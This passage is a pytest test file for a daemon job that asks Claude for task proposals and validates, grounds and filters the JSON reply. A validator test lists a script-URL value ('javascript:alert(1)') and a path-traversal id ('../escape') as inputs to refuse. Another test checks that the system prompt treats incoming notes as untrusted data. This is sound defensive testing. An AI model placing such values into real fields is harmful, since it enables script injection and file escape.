"""The task-proposals job (spec 1c "Proposals"): jarvisd/propose.py.

The model, the config table, the reply checks, the job, the scheduling and the commands are
tested against a throwaway machine. The paid call goes through the real ClaudeClient into
tests/fakes/fake_claude.py, started as a real child process. Everything is synthetic (design D10).
"""
from __future__ import annotations

import ast
import json
import os
import sys
import tomllib
from dataclasses import dataclass
from datetime import date, datetime, timedelta, timezone
from pathlib import Path
from typing import Any

import pytest
from pydantic import ValidationError

from conftest import CANARY, FakeClock
from jarvisd import ROOT, cli, propose
from jarvisd import daemon as daemon_mod
from jarvisd.audit import AuditLog
from jarvisd.claude import ClaudeClient, default_runner
from jarvisd.collectors import CollectContext
from jarvisd.common import iso
from jarvisd.config import Config, ConfigError, build_config
from jarvisd.digest import Deps, Retry
from jarvisd.jobstore import JobStore
from jarvisd.models import CollectResult, HistoryEntry, Item, Job, JobWindow, Proposal, RunManifest, WithheldItem
from jarvisd.notify import NotifyResult
from jarvisd.propose import (
    NEGATIVE_PREFIX,
    PROPOSE_KIND,
    load_proposals,
    normalize_title,
    parse_proposals,
    proposals_dir,
    reconcile_proposals,
    run_propose_job,
    save_proposal,
)
from jarvisd.router import build_router
from jarvisd.scheduler import DIGEST_KIND
from jarvisd.state import StateStore
from jarvisd.vault import VaultWriter

FAKE = ROOT / "tests" / "fakes" / "fake_claude.py"
READY = (0, '"\\JarvisDaemon","10/7/2026 6:00:00 AM","Ready"\n')
DASHES = (chr(0x2014), chr(0x2013))


# --- rig ------------------------------------------------------------------------------


class FakeRunner:
    """Starts the fake instead of `claude`; adds the FAKE_* variables the client never passes."""

    def __init__(self, tmp_path: Path, scenario: str = "ok", **extra: str) -> None:
        self.log = tmp_path / "fake-claude.jsonl"
        self.scenario = scenario
        self.extra = extra

    def __call__(self, argv: Any, *, env: Any, cwd: str, creationflags: int) -> Any:
        full = [sys.executable, str(FAKE), *list(argv)[1:]]
        env2 = {**env, "FAKE_CLAUDE_LOG": str(self.log), "FAKE_CLAUDE_SCENARIO": self.scenario, **self.extra}
        return default_runner(full, env=env2, cwd=cwd, creationflags=creationflags)

    def records(self) -> list[dict[str, Any]]:
        if not self.log.exists():
            return []
        return [json.loads(line) for line in self.log.read_text(encoding="utf-8").splitlines() if line]

    def paid(self) -> list[dict[str, Any]]:
        return [r for r in self.records() if r["argv"][:1] not in (["--version"], ["--help"])]


class Stub:
    """A collector with fixed items. `calls` says whether the job ran it."""

    def __init__(self, name: str, items: list[Item] | None = None) -> None:
        self.name = name
        self.items = items or []
        self.calls = 0

    def collect(self, ctx: CollectContext) -> CollectResult:
        self.calls += 1
        return CollectResult(source=self.name, ok=True, items=list(self.items))


class Notes:
    name = "recording"

    def __init__(self) -> None:
        self.messages: list[str] = []

    def send(self, message: str) -> NotifyResult:
        self.messages.append(message)
        return NotifyResult(ok=True, detail="sent")


@dataclass
class Rig:
    cfg: Config
    deps: Deps
    audit: AuditLog
    state: StateStore
    store: JobStore
    runner: FakeRunner
    clock: FakeClock
    vault: Path
    brain: Stub
    root: Path

    @property
    def day(self) -> date:
        return self.clock.now.date()

    @property
    def dir(self) -> Path:
        return proposals_dir(self.state.dir)

    def events(self, name: str) -> list[dict[str, Any]]:
        return self.audit.records(events=[name])

    def stored(self) -> list[Proposal]:
        return load_proposals(self.dir)


def item(item_id: str, title: str, text: str = "", **over: Any) -> Item:
    return Item(id=item_id, source="brain", kind="brain_thread", title=title, text=text, priority=1, **over)


CLEAN = [
    item("t-open-1", "Synthetic thread one", "Waiting on a reviewer for the synthetic widget"),
    item("t-open-2", "Synthetic thread two", "The synthetic queue needs a retry policy"),
    item("t-dec-1", "Synthetic decision", "Keep one queue because ordering matters"),
]


def tree(root: Path) -> set[str]:
    return {p.relative_to(root).as_posix() for p in root.rglob("*") if p.is_file()}


def build(tmp_cfg: Config, tmp_path: Path, tmp_vault: Path, *, scenario: str = "ok", claude: bool = True,
          mutate: Any = None, items: list[Item] | None = None, **extra: str) -> Rig:
    cfg = tmp_cfg.model_copy(deep=True)
    cfg.claude.binary = str(FAKE)
    if mutate is not None:
        mutate(cfg)
    clock = FakeClock(datetime.now(timezone.utc).replace(microsecond=0))
    audit = AuditLog(cfg.paths.logs / "jarvisd-audit.jsonl", mirror_stdout=False)
    state = StateStore.from_config(cfg)
    store = JobStore.from_config(cfg, audit=audit)
    runner = FakeRunner(tmp_path, scenario, **extra)
    client = ClaudeClient(cfg, audit, state, runner=runner, enabled=claude, network_probe=lambda: True,
                          sleep=lambda s: None, poll_seconds=0.1)
    brain = Stub("brain", list(CLEAN if items is None else items))
    deps = Deps(cfg=cfg, audit=audit, state=state, store=store, vault=VaultWriter(cfg, audit), claude=client,
                router=build_router(cfg), notifier=Notes(), collectors=[brain], clock=clock)
    return Rig(cfg, deps, audit, state, store, runner, clock, tmp_vault, brain, tmp_path / "jarvis")


def plant_digest(rig: Rig, job_id: str | None = None, status: str = "complete", minutes_ago: float = 20.0) -> str:
    """A finished digest run: its manifest on disk, which is all the proposals job reads of it."""
    job_id = job_id or f"digest-{rig.day.isoformat()}"
    finished = rig.clock.now - timedelta(minutes=minutes_ago)
    manifest = RunManifest(job_id=job_id, status=status, started_at=iso(finished - timedelta(minutes=1)),
                           finished_at=iso(finished), counts={"collected": 3, "cleared": 3, "to_claude": 3})
    path = rig.state.dir / "runs" / job_id / "run.json"
    path.parent.mkdir(parents=True, exist_ok=True)
    path.write_text(manifest.model_dump_json(indent=2) + "\n", encoding="utf-8", newline="\n")
    return job_id


def plant_done_digest(rig: Rig, result_status: str = "complete", job_id: str | None = None) -> Job:
    """A digest job in queue/done, the way the daemon leaves it."""
    now = rig.clock.now
    created = iso(now - timedelta(minutes=30))
    job = Job(
        id=job_id or f"digest-{rig.day.isoformat()}", kind=DIGEST_KIND, key=rig.day.isoformat(),
        job_class="observe_only", latency_class="background_batch", origin="schedule", created_at=created,
        not_before=created, window=JobWindow(start=iso(now - timedelta(hours=36)), end=created),
        history=[HistoryEntry(ts=created, from_state=None, to="pending", note="test")],
    )
    assert rig.store.enqueue(job)
    claimed = rig.store.claim_next(now)
    assert claimed is not None and claimed.id == job.id
    rig.store.complete(claimed, {"status": result_status})
    done = rig.store.get(job.id)
    assert done is not None
    return done


def new_job(rig: Rig, *, attempts: int = 1, force: bool = False, dry_run: bool = False, no_claude: bool = False,
            suffix: str = "") -> Job:
    """Enqueue and claim, the way the daemon does."""
    now = rig.clock.now
    created = iso(now)
    job = Job(
        id=f"propose-{rig.day.isoformat()}{suffix}", kind=PROPOSE_KIND, key=rig.day.isoformat(),
        job_class="observe_only", latency_class="background_batch", origin="manual",
        created_at=created, not_before=created, deadline=iso(now + timedelta(hours=3)),
        params={"force": force, "dry_run": dry_run, "no_claude": no_claude, "notify": False},
        history=[HistoryEntry(ts=created, from_state=None, to="pending", note="test")],
    )
    assert rig.store.enqueue(job)
    claimed = rig.store.claim_next(now)
    assert claimed is not None and claimed.id == job.id
    claimed.attempts = attempts
    rig.store.update(claimed)
    return claimed


def on(cfg: Config) -> None:
    cfg.propose.enabled = True


def ready(tmp_cfg: Config, tmp_path: Path, tmp_vault: Path, **kw: Any) -> Rig:
    """An enabled rig with a complete digest run on disk."""
    mutate = kw.pop("mutate", None)

    def both(cfg: Config) -> None:
        on(cfg)
        if mutate is not None:
            mutate(cfg)

    rig = build(tmp_cfg, tmp_path, tmp_vault, mutate=both, **kw)
    plant_digest(rig)
    return rig


def proposal(n: int = 1, **over: Any) -> Proposal:
    base: dict[str, Any] = dict(
        id=f"p-{n:08x}", created_at=iso(datetime(2026, 10, 1, 8, n % 60, tzinfo=timezone.utc)), run_id="digest-2026-10-01",
        title=f"Synthetic proposal {n:02d}", project="synthetic-project", kind="task", evidence=["t-open-1"],
        suggested_status="to do", rationale="Synthetic reason.")
    base.update(over)
    return Proposal(**base)


# --- the model ---------------------------------------------------------------------------


def test_a_proposal_round_trips_and_defaults_to_proposed() -> None:
    p = proposal(1, due_hint=date(2026, 10, 9))
    again = Proposal.model_validate_json(p.model_dump_json())
    assert again == p
    assert p.status == "proposed" and p.tracker_ref is None and p.rejected_reason is None
    assert p.edits.model_dump() == {"title": None, "project": None, "due": None}
    assert json.loads(p.model_dump_json())["due_hint"] == "2026-10-09"


@pytest.mark.parametrize("bad", [
    {"kind": "epic"}, {"status": "done"}, {"rationale": "x" * 241}, {"title": ""}, {"evidence": []},
    {"id": "../escape"}, {"tracker_ref": "javascript:alert(1)"}, {"tracker_ref": "not a url"}, {"extra_key": 1},
    {"due_hint": "next friday"}, {"created_at": "yesterday"},
])
def test_a_proposal_refuses_a_bad_field(bad: dict[str, Any]) -> None:
    with pytest.raises(ValidationError):
        proposal(1, **bad)


def test_a_proposal_accepts_the_limits_and_a_tracker_url() -> None:
    p = proposal(2, rationale="x" * 240, status="confirmed", tracker_ref="https://tracker.example/t/1",
                 edits={"title": "Edited", "due": "2026-10-12"})
    assert len(p.rationale) == 240 and p.edits.title == "Edited" and p.edits.due == date(2026, 10, 12)
    with pytest.raises(ValidationError):
        Proposal.model_validate({**p.model_dump(mode="json"), "edits": {"owner": "x"}})


def test_a_proposal_strips_dashes_from_its_text() -> None:
    p = proposal(3, title=f"Fix the build {DASHES[0]} today", rationale=f"Range 10{DASHES[1]}12")
    assert not any(d in p.title + p.rationale for d in DASHES)


# --- the config table ----------------------------------------------------------------------


def test_the_tracked_config_ships_the_table_switched_off() -> None:
    raw = tomllib.loads((ROOT / "jarvis.toml").read_text(encoding="utf-8"))
    assert raw["propose"] == {"enabled": False, "max_proposals": 8, "max_budget_usd": 0.30, "run_after_digest": True}


def test_the_propose_defaults_and_validation(tmp_cfg: Config) -> None:
    c = tmp_cfg.propose
    assert (c.enabled, c.max_proposals, c.max_budget_usd, c.run_after_digest) == (False, 8, 0.30, True)
    raw = tomllib.loads((ROOT / "jarvis.toml").read_text(encoding="utf-8"))
    for bad in ({"max_proposals": 0}, {"max_proposals": 21}, {"max_budget_usd": 0}, {"max_budget_usd": 5.0},
                {"enabled": "yes"}, {"run_after_digest": 1}, {"typo": 1}):
        with pytest.raises(ConfigError):
            build_config({**raw, "propose": {**raw["propose"], **bad}})


# --- normalizing and storing ----------------------------------------------------------------


def test_normalize_title_folds_case_accents_punctuation_and_spacing() -> None:
    assert normalize_title("  Fix the BUILD!! ") == normalize_title("fix  the build")
    assert normalize_title("Revoir l'\u00e9tape") == normalize_title("revoir l etape")
    assert normalize_title("a") != normalize_title("b")


def test_the_store_saves_atomically_and_loads_in_order(tmp_path: Path) -> None:
    folder = tmp_path / "proposals"
    for n in (3, 1, 2):
        save_proposal(folder, proposal(n))
    assert sorted(p.name for p in folder.iterdir()) == [f"p-{n:08x}.json" for n in (1, 2, 3)]
    assert [p.title for p in load_proposals(folder)] == ["Synthetic proposal 01", "Synthetic proposal 02",
                                                         "Synthetic proposal 03"]
    assert not [p for p in folder.iterdir() if p.name.startswith(".")], "no temp file is left"
    assert load_proposals(tmp_path / "missing") == []


def test_the_store_skips_a_damaged_file(tmp_path: Path) -> None:
    folder = tmp_path / "proposals"
    save_proposal(folder, proposal(1))
    (folder / "p-broken.json").write_text("{not json", encoding="utf-8")
    (folder / "p-wrong.json").write_text(json.dumps({"id": "p-wrong"}), encoding="utf-8")
    assert [p.id for p in load_proposals(folder)] == ["p-00000001"]


# --- the latest digest run ----------------------------------------------------------------------


def test_the_latest_complete_digest_manifest_wins(tmp_cfg: Config, tmp_path: Path, tmp_vault: Path) -> None:
    rig = build(tmp_cfg, tmp_path, tmp_vault)
    assert propose.latest_digest_manifest(rig.state.dir) is None
    plant_digest(rig, "digest-2026-10-01", minutes_ago=3000)
    plant_digest(rig, "digest-2026-10-02", minutes_ago=2000)
    plant_digest(rig, "digest-2026-10-03", status="partial", minutes_ago=10)
    plant_digest(rig, "consolidate-2026-10-04", status="complete", minutes_ago=5)
    found = propose.latest_digest_manifest(rig.state.dir)
    assert found is not None and found.job_id == "digest-2026-10-02"
    (rig.state.dir / "runs" / "digest-2026-10-09").mkdir()
    (rig.state.dir / "runs" / "digest-2026-10-09" / "run.json").write_text("{bad", encoding="utf-8")
    again = propose.latest_digest_manifest(rig.state.dir)
    assert again is not None and again.job_id == "digest-2026-10-02"


# --- the reply: parse, check, clean ------------------------------------------------------------


IDS = {"t-open-1", "t-open-2", "t-dec-1"}


def draft(title: str = "Reply to the reviewer", **over: Any) -> dict[str, Any]:
    base = {"title": title, "project": "synthetic-project", "kind": "task", "evidence": ["t-open-1"],
            "suggested_status": "to do", "due_hint": None, "rationale": "Synthetic reason."}
    base.update(over)
    return base


def reply(*drafts: Any) -> str:
    return json.dumps(list(drafts))


def test_parse_accepts_a_valid_reply(tmp_cfg: Config) -> None:
    out = parse_proposals(reply(draft(), draft("Plan it", kind="risk", due_hint="2026-10-09",
                                                 evidence=["t-open-1", "t-dec-1"])), IDS, tmp_cfg, 8)
    assert [d.title for d in out.proposals] == ["Reply to the reviewer", "Plan it"]
    assert out.proposals[1].due_hint == date(2026, 10, 9) and out.proposals[1].evidence == ["t-open-1", "t-dec-1"]
    assert out.proposals[0].kind == "task" and out.dropped() == {
        "invalid": 0, "ungrounded": 0, "flagged": 0, "duplicate": 0, "over_limit": 0}


def test_parse_drops_a_proposal_with_any_evidence_outside_the_cleared_set(tmp_cfg: Config) -> None:
    out = parse_proposals(reply(draft("Good"), draft("Invented", evidence=["made-up"]),
                                draft("Half", evidence=["t-open-1", "made-up"])), IDS, tmp_cfg, 8)
    assert [d.title for d in out.proposals] == ["Good"] and out.dropped_ungrounded == 2


def test_parse_drops_a_proposal_without_evidence_and_ignores_repeated_ids(tmp_cfg: Config) -> None:
    out = parse_proposals(reply(draft("Bare", evidence=[]), draft("Twice", evidence=["t-open-1", "t-open-1"])),
                          IDS, tmp_cfg, 8)
    assert [d.title for d in out.proposals] == ["Twice"] and out.proposals[0].evidence == ["t-open-1"]
    assert out.dropped_invalid == 1


def test_parse_drops_a_malformed_element_and_keeps_the_rest(tmp_cfg: Config) -> None:
    out = parse_proposals(reply(draft("Good"), {**draft("Extra key"), "owner": "x"}, draft("Bad kind", kind="epic"),
                                draft("Bad due", due_hint="next friday"), "a string", {"title": "short"},
                                {**draft("Number title"), "title": 7}), IDS, tmp_cfg, 8)
    assert [d.title for d in out.proposals] == ["Good"] and out.dropped_invalid == 6


def test_parse_rejects_bad_json_and_a_reply_that_is_not_a_list(tmp_cfg: Config) -> None:
    with pytest.raises(ValueError):
        parse_proposals("not json [", IDS, tmp_cfg, 8)
    with pytest.raises(ValidationError):
        parse_proposals(json.dumps({"proposals": []}), IDS, tmp_cfg, 8)
    assert parse_proposals("[]", IDS, tmp_cfg, 8).proposals == []


def test_parse_strips_a_fence_dashes_markup_and_clips(tmp_cfg: Config) -> None:
    fenced = "```json\n" + reply(draft(f"[[Link]] {DASHES[0]} <b>bold</b> thing", rationale="y" * 400,
                                        project=f"proj {DASHES[1]} x")) + "\n```"
    out = parse_proposals(fenced, IDS, tmp_cfg, 8)
    only = out.proposals[0]
    assert only.title == "Link, bold thing" and len(only.rationale) <= 240 and only.rationale.startswith("yyyy")
    assert not any(d in only.title + only.project + only.rationale for d in DASHES)
    long_title = parse_proposals(reply(draft("w" * 300)), IDS, tmp_cfg, 8).proposals[0].title
    assert len(long_title) <= 120


def test_parse_caps_the_count_and_dedupes_by_normalized_title(tmp_cfg: Config) -> None:
    many = [draft(f"Work {n}") for n in range(12)]
    out = parse_proposals(reply(*many), IDS, tmp_cfg, 8)
    assert len(out.proposals) == 8 and out.dropped_over_limit == 4
    out = parse_proposals(reply(draft("Fix the build"), draft("fix  the BUILD!"), draft("Other")), IDS, tmp_cfg, 8)
    assert [d.title for d in out.proposals] == ["Fix the build", "Other"] and out.dropped_duplicate == 1
    out = parse_proposals(reply(draft("Fix the build"), draft("Other")), IDS, tmp_cfg, 8,
                          existing=frozenset({normalize_title("fix the build")}))
    assert [d.title for d in out.proposals] == ["Other"] and out.dropped_duplicate == 1


def test_parse_drops_a_proposal_that_echoes_a_sensitive_term(tmp_cfg: Config) -> None:
    cfg = tmp_cfg.model_copy(deep=True)
    cfg.gates.sensitive_terms = ["zebra-token"]
    out = parse_proposals(reply(draft("Rotate the zebra-token"), draft("Fine"), draft("Fine two", rationale="Fine reason"),
                                draft("Via project", project="zebra-token")), IDS, cfg, 8)
    assert [d.title for d in out.proposals] == ["Fine", "Fine two"] and out.dropped_flagged == 2


def test_the_draft_round_trips_through_json(tmp_cfg: Config) -> None:
    out = parse_proposals(reply(draft(due_hint="2026-10-09")), IDS, tmp_cfg, 8)
    again = propose.ParsedProposals.from_json(json.loads(json.dumps(out.to_json())))
    assert again.proposals == out.proposals and again.dropped() == out.dropped()


# --- the payload: dry run, held content, negative examples ---------------------------------------


def test_dry_run_prints_a_payload_and_writes_nothing(tmp_cfg: Config, tmp_path: Path, tmp_vault: Path) -> None:
    rig = build(tmp_cfg, tmp_path, tmp_vault)
    plant_digest(rig)
    before = tree(rig.state.dir)
    result = run_propose_job(new_job(rig, dry_run=True), rig.deps, mode="manual")
    assert result["status"] == "dry_run" and result["run_id"] == f"digest-{rig.day.isoformat()}"
    for name in ("Synthetic thread one", "Synthetic thread two", "t-dec-1"):
        assert name in result["payload"]
    assert result["items"]["to_claude"] == 3 and result["payload_bytes"] > 0 and result["payload_sha256"]
    assert f"at most {rig.cfg.propose.max_proposals} task proposals" in result["header"]
    assert not rig.dir.exists() or not list(rig.dir.iterdir())
    assert rig.runner.records() == [], "nothing was spawned, not even --version"
    assert rig.state.budget.snapshot()["calls"] == 0
    assert tree(rig.state.dir) == before, "no proposal, no run manifest, no budget reservation"


def test_dry_run_needs_no_switch_and_no_claude(tmp_cfg: Config, tmp_path: Path, tmp_vault: Path) -> None:
    rig = build(tmp_cfg, tmp_path, tmp_vault, claude=False)
    assert rig.cfg.propose.enabled is False
    plant_digest(rig)
    result = run_propose_job(new_job(rig, dry_run=True), rig.deps, mode="manual")
    assert result["status"] == "dry_run" and result["items"]["to_claude"] == 3


def held_items() -> list[Item]:
    return [
        item("t-term", "Rotate the thing", "Rotate the zebra-token before friday"),
        item("t-tag", "Tagged note", f"Private plan {CANARY}", tags=["sensitive"]),
        item("t-path", "Telos note", f"From the profile {CANARY}", paths=["C:/x/brain/telos/profile.md"]),
    ]


def zebra(cfg: Config) -> None:
    cfg.gates.sensitive_terms = ["zebra-token"]


def test_dry_run_payload_carries_no_held_content(tmp_cfg: Config, tmp_path: Path, tmp_vault: Path) -> None:
    rig = build(tmp_cfg, tmp_path, tmp_vault, mutate=zebra, items=[*CLEAN, *held_items()])
    plant_digest(rig)
    result = run_propose_job(new_job(rig, dry_run=True), rig.deps, mode="manual")
    blob = json.dumps(result)
    assert "zebra" not in blob and CANARY not in blob and "Rotate the thing" not in blob
    assert result["items"] == {"gated": 6, "held": 3, "to_claude": 3, "negative_examples": 0, "open_examples": 0}
    assert {h["id"] for h in result["held"]} == {"t-term", "t-tag", "t-path"}
    assert all(set(h) == {"id", "kind", "reason", "hold_kind"} for h in result["held"]), "references by id only"


def test_a_real_run_never_sends_held_content_anywhere(tmp_cfg: Config, tmp_path: Path, tmp_vault: Path) -> None:
    rig = ready(tmp_cfg, tmp_path, tmp_vault, mutate=zebra, items=[*CLEAN, *held_items()])
    run_propose_job(new_job(rig), rig.deps, mode="daemon")
    stdin = rig.runner.paid()[0]["stdin"]
    assert "zebra" not in stdin and CANARY not in stdin and "Tagged note" not in stdin and "Telos note" not in stdin
    assert "t-term" not in stdin and "t-tag" not in stdin and "t-path" not in stdin, "held ids stay home too"
    for path in rig.root.rglob("*"):
        if path.is_file():
            text = path.read_text(encoding="utf-8", errors="ignore")
            assert CANARY not in text and "zebra" not in text, path


def test_a_held_item_can_never_be_cited_as_evidence(tmp_cfg: Config, tmp_path: Path, tmp_vault: Path) -> None:
    # The model is told nothing about t-term, but the check must hold even if it guesses the id.
    rig = ready(tmp_cfg, tmp_path, tmp_vault, mutate=zebra, items=[*CLEAN, *held_items()],
                FAKE_CLAUDE_PROPOSALS="held_guess")
    result = run_propose_job(new_job(rig), rig.deps, mode="daemon")
    assert result["proposals"] == 0 and result["dropped"]["ungrounded"] == 1 and rig.stored() == []


def saved_rejections(rig: Rig, count: int, **over: Any) -> None:
    for n in range(count):
        save_proposal(rig.dir, proposal(n + 1, status="rejected", title=f"Rejected work {n:02d}",
                                        rejected_reason=f"reason-{n:02d}", **over))


def test_the_last_twenty_rejected_proposals_are_in_the_payload_as_negative_examples(
        tmp_cfg: Config, tmp_path: Path, tmp_vault: Path) -> None:
    rig = build(tmp_cfg, tmp_path, tmp_vault)
    plant_digest(rig)
    saved_rejections(rig, 25)
    save_proposal(rig.dir, proposal(40, title="Still proposed", status="proposed"))
    save_proposal(rig.dir, proposal(41, title="Already confirmed", status="confirmed"))
    result = run_propose_job(new_job(rig, dry_run=True), rig.deps, mode="manual")
    payload = result["payload"]
    for n in range(5, 25):
        assert f"Rejected work {n:02d}" in payload and f"reason-{n:02d}" in payload
    for n in range(0, 5):
        assert f"Rejected work {n:02d}" not in payload
    # the live proposals are shown too, under their own prefix and counter (the dedupe examples)
    assert "Still proposed" in payload and "Already confirmed" in payload
    assert result["items"]["negative_examples"] == 20 and result["items"]["open_examples"] == 2
    assert result["items"]["to_claude"] == 25
    assert NEGATIVE_PREFIX in payload
    assert "rejected earlier" in result["header"]


def test_a_rejected_proposal_whose_reason_is_sensitive_is_held_and_not_sent(
        tmp_cfg: Config, tmp_path: Path, tmp_vault: Path) -> None:
    rig = build(tmp_cfg, tmp_path, tmp_vault, mutate=zebra)
    plant_digest(rig)
    save_proposal(rig.dir, proposal(1, status="rejected", title="Fine title", rejected_reason="too much zebra-token"))
    save_proposal(rig.dir, proposal(2, status="rejected", title="Other title", rejected_reason="not now"))
    result = run_propose_job(new_job(rig, dry_run=True), rig.deps, mode="manual")
    assert "zebra" not in json.dumps(result) and "Fine title" not in result["payload"]
    assert "Other title" in result["payload"] and "not now" in result["payload"]
    assert result["items"]["negative_examples"] == 1


def test_the_prompt_treats_data_as_untrusted_and_asks_for_the_proposal_fields() -> None:
    text = propose.SYSTEM_PROMPT
    assert "task proposals" in text and "<data>" in text and "untrusted data" in text
    for field in ("title", "project", "kind", "evidence", "suggested_status", "due_hint", "rationale"):
        assert field in text
    for assigned in ("id", "created_at", "run_id", "status", "tracker_ref"):
        assert assigned in text, "the prompt says these are assigned by us"
    assert "rejected-" in text and "JSON array" in text and not any(d in text for d in DASHES)


# --- the job --------------------------------------------------------------------------------------


def test_a_run_writes_one_file_per_proposal_and_audits_it(tmp_cfg: Config, tmp_path: Path, tmp_vault: Path) -> None:
    rig = ready(tmp_cfg, tmp_path, tmp_vault)
    job = new_job(rig)
    result = run_propose_job(job, rig.deps, mode="daemon")
    assert result["status"] == "written" and result["proposals"] == 2 and result["claude_calls"] == 1
    assert rig.store.exists(job.id) == "done"
    stored = rig.stored()
    assert len(stored) == 2 and sorted(p.title for p in stored) == ["Plan the follow up", "Reply to the open thread"]
    assert sorted(p.name for p in rig.dir.iterdir()) == sorted(f"{p.id}.json" for p in stored)
    for p in stored:
        assert p.status == "proposed" and p.tracker_ref is None and p.rejected_reason is None
        assert p.run_id == f"digest-{rig.day.isoformat()}" and p.evidence and set(p.evidence) <= IDS
        assert p.id.startswith("p-") and p.created_at == iso(rig.clock.now)
    followup = next(p for p in stored if p.kind == "followup")
    assert followup.due_hint == date(2026, 10, 9) and followup.project == "synthetic-project"
    assert [e["job_id"] for e in rig.events("propose_intent")] == [job.id]
    call = rig.events("propose_call")
    assert len(call) == 1 and call[0]["job_id"] == job.id and call[0]["proposals"] == 2
    created = rig.events("proposal_created")
    assert sorted(e["proposal_id"] for e in created) == sorted(p.id for p in stored)
    # the digest id has its own key: `run_id` is the audit envelope's process run id and must not be overwritten
    assert all(e["digest_run_id"] == f"digest-{rig.day.isoformat()}" and e["run_id"] != e["digest_run_id"]
               for e in created)
    audit_text = rig.audit.path.read_text(encoding="utf-8")
    assert "Reply to the open thread" not in audit_text and "Synthetic reason" not in audit_text, "ids and counts only"


def test_a_run_writes_nothing_but_proposals_and_its_manifest(tmp_cfg: Config, tmp_path: Path, tmp_vault: Path) -> None:
    rig = ready(tmp_cfg, tmp_path, tmp_vault)
    vault_before, state_before = tree(tmp_vault), tree(rig.state.dir)
    job = new_job(rig)
    run_propose_job(job, rig.deps, mode="daemon")
    assert tree(tmp_vault) == vault_before, "the vault is not touched"
    added = tree(rig.state.dir) - state_before
    assert all(a.startswith(("proposals/", "runs/", "budget", "breaker", "claude-cwd")) for a in added), added
    manifest = json.loads((rig.state.dir / "runs" / job.id / "run.json").read_text(encoding="utf-8"))
    assert manifest["job_id"] == job.id and manifest["counts"]["proposals"] == 2


def test_the_call_uses_the_isolated_argv_the_propose_cap_and_the_ledger(
        tmp_cfg: Config, tmp_path: Path, tmp_vault: Path) -> None:
    def mutate(cfg: Config) -> None:
        cfg.propose.max_budget_usd = 0.25

    rig = ready(tmp_cfg, tmp_path, tmp_vault, mutate=mutate)
    assert rig.cfg.claude.max_budget_usd == 0.5
    run_propose_job(new_job(rig), rig.deps, mode="daemon")
    paid = rig.runner.paid()
    assert len(paid) == 1
    argv = paid[0]["argv"]
    for flag, value in (("--tools", ""), ("--setting-sources", ""), ("--permission-prompts", "none"),
                        ("--max-budget-usd", "0.25")):
        assert argv[argv.index(flag) + 1] == value
    assert "--strict-mcp-config" in argv and "--no-session-persistence" in argv and "--disable-slash-commands" in argv
    assert argv[argv.index("--system-prompt") + 1] == propose.SYSTEM_PROMPT
    assert "at most 8 task proposals" in paid[0]["stdin"], "the limit travels in the header"
    snap = rig.state.budget.snapshot()
    assert snap["calls"] == 1 and snap["by_purpose"].get("propose", 0) > 0
    intent = rig.events("claude_intent")
    assert len(intent) == 1 and intent[0]["purpose"] == "propose" and intent[0]["max_budget_usd"] == 0.25
    assert rig.cfg.claude.max_budget_usd == 0.5 and rig.deps.claude.cfg.claude.max_budget_usd == 0.5, \
        "the shared config and client are left as they were"


def test_a_valid_reply_with_no_proposals_is_a_clean_run(tmp_cfg: Config, tmp_path: Path, tmp_vault: Path) -> None:
    rig = ready(tmp_cfg, tmp_path, tmp_vault, FAKE_CLAUDE_PROPOSALS="none")
    result = run_propose_job(new_job(rig), rig.deps, mode="daemon")
    assert result["status"] == "written" and result["proposals"] == 0 and rig.stored() == []


def test_invalid_json_fails_the_job_and_writes_nothing(tmp_cfg: Config, tmp_path: Path, tmp_vault: Path) -> None:
    rig = ready(tmp_cfg, tmp_path, tmp_vault, FAKE_CLAUDE_PROPOSALS="invalid_json")
    job = new_job(rig, attempts=3)
    result = run_propose_job(job, rig.deps, mode="daemon")
    assert result["status"] == "failed" and result["claude_status"] == "bad_json"
    assert rig.stored() == [] and rig.store.exists(job.id) == "failed"
    assert rig.events("proposal_created") == []


def test_a_reply_that_is_not_a_list_fails_as_bad_schema(tmp_cfg: Config, tmp_path: Path, tmp_vault: Path) -> None:
    rig = ready(tmp_cfg, tmp_path, tmp_vault, FAKE_CLAUDE_PROPOSALS="not_a_list")
    result = run_propose_job(new_job(rig, attempts=3), rig.deps, mode="daemon")
    assert result["status"] == "failed" and result["claude_status"] == "bad_schema" and rig.stored() == []


def test_one_malformed_proposal_does_not_cost_the_good_one(tmp_cfg: Config, tmp_path: Path, tmp_vault: Path) -> None:
    rig = ready(tmp_cfg, tmp_path, tmp_vault, FAKE_CLAUDE_PROPOSALS="one_bad")
    result = run_propose_job(new_job(rig), rig.deps, mode="daemon")
    assert [p.title for p in rig.stored()] == ["Good work"] and result["dropped"]["invalid"] == 1


def test_evidence_outside_the_cleared_set_is_dropped(tmp_cfg: Config, tmp_path: Path, tmp_vault: Path) -> None:
    rig = ready(tmp_cfg, tmp_path, tmp_vault, FAKE_CLAUDE_PROPOSALS="outside")
    result = run_propose_job(new_job(rig), rig.deps, mode="daemon")
    assert [p.title for p in rig.stored()] == ["Grounded work"] and result["dropped"]["ungrounded"] == 1


def test_a_proposal_with_one_unsent_evidence_id_is_dropped_whole(tmp_cfg: Config, tmp_path: Path,
                                                                  tmp_vault: Path) -> None:
    rig = ready(tmp_cfg, tmp_path, tmp_vault, FAKE_CLAUDE_PROPOSALS="mixed")
    result = run_propose_job(new_job(rig), rig.deps, mode="daemon")
    assert result["proposals"] == 0 and result["dropped"]["ungrounded"] == 1 and rig.stored() == []


def test_a_rejected_example_is_not_evidence(tmp_cfg: Config, tmp_path: Path, tmp_vault: Path) -> None:
    rig = ready(tmp_cfg, tmp_path, tmp_vault, FAKE_CLAUDE_PROPOSALS="echo_rejected")
    saved_rejections(rig, 2)
    result = run_propose_job(new_job(rig), rig.deps, mode="daemon")
    assert "rejected-" in rig.runner.paid()[0]["stdin"]
    assert result["proposals"] == 0 and result["dropped"]["ungrounded"] == 1
    assert [p.status for p in rig.stored()] == ["rejected", "rejected"]


def test_a_reply_that_echoes_a_sensitive_term_is_dropped(tmp_cfg: Config, tmp_path: Path, tmp_vault: Path) -> None:
    rig = ready(tmp_cfg, tmp_path, tmp_vault, mutate=zebra, FAKE_CLAUDE_PROPOSALS="canary", FAKE_CLAUDE_TERM="zebra-token")
    result = run_propose_job(new_job(rig), rig.deps, mode="daemon")
    assert result["proposals"] == 0 and result["dropped"]["flagged"] == 1 and rig.stored() == []
    assert "zebra" not in rig.audit.path.read_text(encoding="utf-8")


def test_a_proposal_is_not_created_twice_for_the_same_normalized_title(
        tmp_cfg: Config, tmp_path: Path, tmp_vault: Path) -> None:
    rig = ready(tmp_cfg, tmp_path, tmp_vault, FAKE_CLAUDE_PROPOSALS="dupes")
    result = run_propose_job(new_job(rig), rig.deps, mode="daemon")
